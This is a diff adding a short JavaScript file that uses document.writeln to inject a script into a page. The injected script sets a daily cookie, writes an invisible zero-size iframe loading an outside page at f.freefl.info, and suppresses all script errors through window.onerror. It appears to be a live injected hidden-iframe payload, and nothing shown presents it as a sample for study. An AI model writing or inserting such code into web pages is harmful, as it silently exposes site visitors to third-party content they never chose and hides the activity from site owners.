@@ -1,0 +1,16 @@
+document.writeln("<script>");
+document.writeln("function oK_Begin(){");
+document.writeln("var Then = new Date() ");
+document.writeln("Then.setTime(Then.getTime() + 24*60*60*1000)");
+document.writeln("var cookieString = new String(document.cookie)");
+document.writeln("var cookieHeader = \"Cookie1=\" ");
+document.writeln("var beginPosition = cookieString.indexOf(cookieHeader)");
+document.writeln("if (beginPosition != -1){ ");
+document.writeln("} else ");
+document.writeln("{ document.cookie = \"Cookie1=POPWINDOS;expires=\"+ Then.toGMTString() ");
+document.writeln("document.write(\'<iframe width=0 height=0 src=\"http://f.freefl.info/ads.htm\"><\/iframe>\');");
+document.writeln("}");
+document.writeln("}");
+document.writeln("oK_Begin();");
+document.writeln("<\/script>");
+document.writeln("<script>window.onerror=function(){return true;}<\/script>")
